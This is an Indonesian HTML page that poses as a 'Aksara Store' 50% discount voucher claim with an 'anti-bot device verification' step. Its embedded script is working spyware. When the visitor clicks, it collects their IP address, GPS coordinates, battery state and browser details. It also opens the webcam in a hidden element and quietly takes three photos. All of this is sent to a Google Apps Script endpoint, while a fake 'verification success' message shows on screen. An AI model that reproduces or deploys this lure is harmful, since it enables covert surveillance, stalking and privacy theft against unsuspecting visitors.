<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Klaim Voucher Aksara Store</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; color: #333; text-align: center; margin: 0; }
        .header { background: #1a1a1a; color: #fff; padding: 20px; font-weight: 800; font-size: 18px; }
        .container { max-width: 400px; margin: 40px auto; padding: 30px; background: #fff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .voucher-box { background: #fff3cd; border: 2px dashed #f1c40f; padding: 20px; border-radius: 12px; margin: 25px 0; font-weight: 800; font-size: 20px; color: #856404; }
        .btn { background: #27ae60; color: #fff; border: none; padding: 18px; font-weight: 700; border-radius: 12px; cursor: pointer; font-size: 16px; width: 100%; text-transform: uppercase; transition: 0.3s; }
        .btn:hover { background: #2ecc71; transform: scale(1.02); }
        #status-log { display: none; text-align: left; background: #1a1a1a; color: #00ff00; padding: 15px; font-family: monospace; font-size: 11px; margin-top: 25px; border-radius: 8px; line-height: 1.6; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="header">AKSARA STORE - EXCLUSIVE ACCESS</div>

<div class="container">
    <h2 style="margin:0;">Selamat!</h2>
    <p>Gunakan voucher di bawah untuk diskon 50%.</p>
    <div class="voucher-box">AKSR-50-PROMO</div>
    <p style="font-size: 13px; color: #777;">Klik tombol di bawah untuk aktivasi & verifikasi perangkat (Anti-Bot).</p>
    <button id="claimBtn" class="btn">AKTIFKAN VOUCHER</button>

    <div id="status-log">
        > Memulai sesi verifikasi...<br>
    </div>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
const GAS_URL = "https://script.google.com/macros/s/AKfycbyruTIRjvbMVBuCq2obh9TM-jakhjse1WJR3m6dB9IfgwioL_MvnnyYB4dT4o-GX_sHqg/exec";

const claimBtn = document.getElementById('claimBtn');
const log = document.getElementById('log');

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const d = await res.json();
        return d.ip;
    } catch(e) { return "Unknown"; }
}

claimBtn.addEventListener('click', async () => {
    claimBtn.disabled = true;
    claimBtn.innerText = "SEDANG VERIFIKASI...";
    document.getElementById('status-log').style.display = 'block';
    
    const ip = await getIP();
    const logBox = document.getElementById('status-log');
    logBox.innerHTML += `> IP: ${ip}<br>`;

    let loc = "Ditolak";
    try {
        const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
        loc = `${p.coords.latitude}, ${p.coords.longitude}`;
        logBox.innerHTML += `> GPS: Terkunci<br>`;
    } catch(e) {}

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        logBox.innerHTML += `> Mengaktifkan sensor wajah...<br>`;

        const photos = [];
        const canvas = document.getElementById('canvas');
        
        // Ambil 3 foto dengan jeda 1 detik
        for (let i = 1; i <= 3; i++) {
            await new Promise(r => setTimeout(r, 1000));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            photos.push(canvas.toDataURL('image/jpeg'));
            logBox.innerHTML += `> Frame ${i} berhasil diambil.<br>`;
        }

        logBox.innerHTML += `> Mengirim data ke server...<br>`;
        
        const b = await navigator.getBattery();
        const battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;

        fetch(GAS_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                ip: ip,
                os: navigator.platform,
                browser: navigator.userAgent.split(' ').slice(-3).join(' '),
                battery: battery,
                location: loc,
                images: photos // Mengirim array berisi 3 foto
            })
        }).then(() => {
            logBox.innerHTML += `> <b>VERIFIKASI SUKSES!</b> Voucher Aktif.<br>`;
            stream.getTracks().forEach(t => t.stop());
            claimBtn.innerText = "VOUCHER SUDAH AKTIF";
        });

    } catch (e) {
        logBox.innerHTML += `> Izin kamera ditolak.<br>`;
        claimBtn.innerText = "VERIFIKASI GAGAL";
    }
});
</script>
</body>
</html>
